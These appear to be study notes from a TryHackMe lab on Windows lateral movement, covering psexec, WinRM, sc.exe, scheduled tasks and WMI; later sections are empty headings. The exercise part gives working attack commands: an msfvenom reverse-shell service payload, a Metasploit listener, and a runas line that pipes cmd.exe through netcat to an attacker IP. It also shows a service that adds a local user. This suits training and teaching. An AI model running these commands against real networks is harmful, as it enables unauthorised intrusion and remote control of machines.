# Lateral Movement and Pivoting

Lateral Movement and Pivoting

### Moving Through the Network <a href="#id-39yeo6dpjnlw" id="id-39yeo6dpjnlw"></a>

### What is Lateral Movement? <a href="#xwa45src68y" id="xwa45src68y"></a>

* Lateral movement is a group of techniques used by attackers to move around a target network while creating as few alerts as possible.
* Moving is essential for many reasons:
  * Reaching a goal.
  * Bypassing network restrictions.
  * Establishing additional points of entry.
  * Creating confusion to avoid detection.
* Lateral movement is part of an attack cycle:

![](<../.gitbook/assets/0 (10).png>)

### The Attacker’s Perspective <a href="#ldjcza99cjlo" id="ldjcza99cjlo"></a>

* Simplest way to move laterally is to use standard administrative protocols to connect to other machines around the network:
  * WinRM.
  * RDP.
  * VNC.
  * SSH.
* Care must be taken not to attempt suspicious connections.
* Always attempt to be as silent as possible to avoid detection.

### Administrators and UAC <a href="#id-7llsm5pylxtz" id="id-7llsm5pylxtz"></a>

* There are two types of administrator accounts:
  * **Local accounts** part of the local Administrators group.
    * User Account Control (UAC) imposes restrictions over local administrators.
      * [UAC and remote restrictions](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction).
    * Cannot remotely connect to a machine and perform administrative tasks unless using an interactive session through RDP.
    * Any administrative task requested via RPC, SMB, or WinRM will be denied by Windows.
      * Account is logged in with a filtered medium integrity token.
    * Only account that will get full privileges is the default Administrator account.
  * **Domain accounts** part of the Local Administrators group.
    * Domain accounts with local administration privileges will be logged in with full privileges.
* The UAC remote restrictions security feature can be manually disabled.
* If lateral movement techniques fail it may be due to using a non-default local administrator where UAC is enforced.

### Spawning Processes Remotely <a href="#nvxhkkbmko4t" id="nvxhkkbmko4t"></a>

### Psexec <a href="#qjtsfwg1m2z6" id="qjtsfwg1m2z6"></a>

* Requires membership of the Administrators group.
* Uses port TCP/445.
* Allows an administrator to run commands remotely on any Windows host that they have access to.
* [One of the many Sysinternals tools](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).
* How psexec works:
  * Connect to Admin$ share and upload a service binary called psexecsvc.exe.
  * Connect to the service control manager to create and run a service called PSEXESVC and associate the service binary with C:\Windows\psexecsvc.exe.
  * Create some named pipes to handle stdin/stdout/stderr.

![](<../.gitbook/assets/1 (4).png>)

* Supply the required administrator credentials for the remote host and the command to run:

psexec64.exe \\\\\<target IP> -u \<username> -p \<password> -i \<command>

### Remote Process Creation Using WinRM <a href="#exn0gamx2n12" id="exn0gamx2n12"></a>

* Must be a member of the Remote Management Users group.
* Uses port TCP/5985 (HTTP) or TCP/5986 (HTTPS).
* Windows Remote Management (WinRM) is a web-based protocol used to send PowerShell commands to Windows hosts remotely.
* WinRM is enabled by default on most Windows Server installations.
* Connect to a remote PowerShell session:

winrs.exe -u:\<username> -p:\<password> -r:\<payload>

* Create a PSCredential object to pass different credentials to a Powershell interactive session:

$username = ‘\<username>’;

$password = ‘\<password>’;

$securepassword = convertto-securestring $password -asplaintext -force;

$credential # new-object system.management.automation.pscredential $username, $securepassword;

* Create the interactive session using the Enter-PSSession cmdlet:

enter-pssession -computername \<target> -credential $credential

* Invoke-Command cmdlet runs ScriptBlocks via WinRM using credentials passed through a PSCredential object:

invoke-command -computername \<target> -credential $credential -scriptblock {\<payload>}

### Remotely Creating Services Using sc <a href="#a1gzgzb0vtfk" id="a1gzgzb0vtfk"></a>

* Requires membership of the Administrators group.
* Uses ports TCP/135 and TCP/49152-65535 (DCE/RPC).
* Uses port TCP/445 or TCP/139 (RPC over SMB Named Pipe).
* Windows services can be leveraged to run arbitrary commands since they execute a command when started.
* A service can be created on a remote host using the native Windows sc.exe tool.
* sc will try to connect to the Service Control Manager (SVCCTL) in several ways:
  * Using DCE/RPC where the client connects to the Endpoint Mapper (EPM) at TCP/135.
    * EPM serves as a catalogue of available RPC endpoints.
  * EPM responds with the IP and dynamic port (TCP/49152-65535) to connect to SVCTL.

![](<../.gitbook/assets/2 (4).png>)

* sc will try to reach SVCTL through SMB named pipes (TCP139 or TCP/445) if the DCE/RPC connection fails.

![](<../.gitbook/assets/3 (5).png>)

* Create and start the “thmservice”.
  * net user command will create a new local user on the system when the service starts.

sc.exe \\\\\<target> create thmservice binpath= “net user \<username> \<password> /add” start= auto

sc.exe \\\\\<target> start thmservice

* Stop and delete the service:

sc.exe \\\\\<target> stop thmservice

sc.exe \\\\\<target> delete thmservice

### Creating Scheduled Tasks Remotely <a href="#pnr0i82m5he6" id="pnr0i82m5he6"></a>

* Native Windows schtasks tool can create and run scheduled tasks remotely.
* Create the “thmtask1” task:

schtasks /s \<target> /RU “SYSTEM” /create /tn “thmtask2” /tr “\<payload>” /sc ONCE /sd 01/01/1970 /st 00:00

schtasks /s \<target> /run /TN “thmtask1”

* Delete the scheduled task:

schtasks /S \<target> /TN “thmtask1” /DELETE /F

#### Lateral Movement Using sc Exercise <a href="#id-84uh9r2q7ksi" id="id-84uh9r2q7ksi"></a>

* Assumption is that valid credentials with administrative access have already been captured.
* SSH to jumpbox using non-privileged credentials:

ssh za\\\natasha.howells@thmjmp2.za.tryhackme.com

* sc.exe can be used to upload a reverse shell binary and associate it with a created service.
* Service executables are different to standard .exe files as the service manager will kill them almost immediately.
* Msfvenom supports the exe-service format that encapsulates the payload inside a fully functional service executable that prevents it from being killed.
* Create a stageless reverse shell using Msfvenom:

msfvenom -p windows/shell/reverse\_tcp -f exe-service lhost=\<attacker IP> lport=4444 -o service.exe

![](<../.gitbook/assets/4 (3).png>)

* Use the administrative credentials to upload the payload to the $ADMIN share of the target server using smbclient:

smbclient -c ‘put myservice.exe’ -U \<username> -W ZA ‘//\<target FQDN>/admin$/’ \<password>

![](<../.gitbook/assets/5 (3).png>)

* Start a MSF listener to receive the reverse shell:

msfconsole -q -x “use exploit/multi/handler; set lhost \<attacker IP>; set lport 4444; set payload windows/shell/reverse\_tcp; exploit”

* Use runas on the target to spawn a new shell with the administrative token as sc.exe does not allow credentials to be specified as part of the command.
  * runas command prompt spawns on the user’s session but the attacker only has SSH access so cannot access it.
  * Spawn a second reverse shell with the administrative token:

runas /netonly /user:\<domain>/\<username> “c:\tools\nc64.exe -e cmd.exe \<attacker IP> 4443”

![](<../.gitbook/assets/6 (2).png>)

* Receive the runas reverse shell connection using Netcat:

nc -lvnp 4443

![](<../.gitbook/assets/7 (2).png>)

* Create a new service remotely and associate it with the uploaded binary:

sc.exe \\\\\<target FQDN> create thmservice-9999 binpath= “%windir%\myservice.exe” start= auto

![](<../.gitbook/assets/8 (2).png>)

sc.exe \\\\\<target FQDN> start thmservice-9999

![](<../.gitbook/assets/9 (2).png>)

* Connection is received from the target on the MSG multi/handler listener.

![](<../.gitbook/assets/10 (2).png>)

### Moving Laterally Using WMI <a href="#yle6pc4ey90h" id="yle6pc4ey90h"></a>

* Windows Management Instrumentation (WMI) can be used to perform many lateral movement techniques.
* WMI allows administrators to perform standard management tasks that can be abused to perform lateral movement.

### Connecting to WMI from PowerShell <a href="#hbjwwv7bt9qg" id="hbjwwv7bt9qg"></a>

* Create a PSCredential object to connect to WMI using PowerShell commands:

$username = 'administrator';

$password = 'Mypass123';

$securepassword = convertto-securestring $password -asplaintext -force;

$credential = new-object system.management.automation.pscredential $username, $securePassword;

* Establish a WMI session using either the DCOM or Wsman protocols.
  * **DCOM** - RPC over IP for connecting to WMI.
    * Uses TCP/135 and TCP/49152-65535.
  * **Wsman** - WinRM used for connecting to WMI.
    * Uses TCP/5985 (WinRM HTTP) or TCP/5986 (WinRM HTTPS).
* Establish a WMI session from PowerShell:

$opt = new-cimsessionoption -protocol DCOM

$session = new-cimsession -computerName \<target> -credential $credential -sessionoption $opt -erroraction stop

*
  * New-CimSessionOption cmdlet is used to configure connection options for the WMI session,
  * Options and credentials are passed to the New-CimSession cmdlet to establish a session.

### Remote Process Creation Using WMI <a href="#z4ip9qjbyevp" id="z4ip9qjbyevp"></a>

* Requires membership of the Administrators group.
* Uses port TCP/5985 (WinRM HTTP) or TCP/5986 (WinRM HTTPS).
* Uses ports TCP/135 and TCP/49152-65535 (DCE/RPC).
* Send a WMI request via PowerShell to the Win32\_Process class to spawn a process under an existing WMI session:

$command = “powershell.exe -command set-content -path c:\text.txt -value munrawashere”;

invoke-cimmethod -cimsession $session -classname win32\_process -methodname create -arguments @{

commandline = $command

}

* Send a WMI request via wmic to spawn a process:

wmic.exe /user:administrator /password:Mypass123 /node:\<target> process call create “cmd.exe /c calc.exe”

### Creating Services Remotely with WMI <a href="#xnr6xtlqvcb7" id="xnr6xtlqvcb7"></a>

### Creating Scheduled Tasks Remotely with WMI <a href="#pdmlbh8jd9eh" id="pdmlbh8jd9eh"></a>

### Installing MSI Packages Through WMI <a href="#vyvv3xhra7cp" id="vyvv3xhra7cp"></a>

### Use of Alternate Authentication Material <a href="#lm0zz6yuq442" id="lm0zz6yuq442"></a>

### Abusing User Behaviour <a href="#v2teotl61kx7" id="v2teotl61kx7"></a>

### Port Forwarding <a href="#ohvbh9mx9xw" id="ohvbh9mx9xw"></a>

### Conclusion <a href="#mrg4qfo6ul7g" id="mrg4qfo6ul7g"></a>
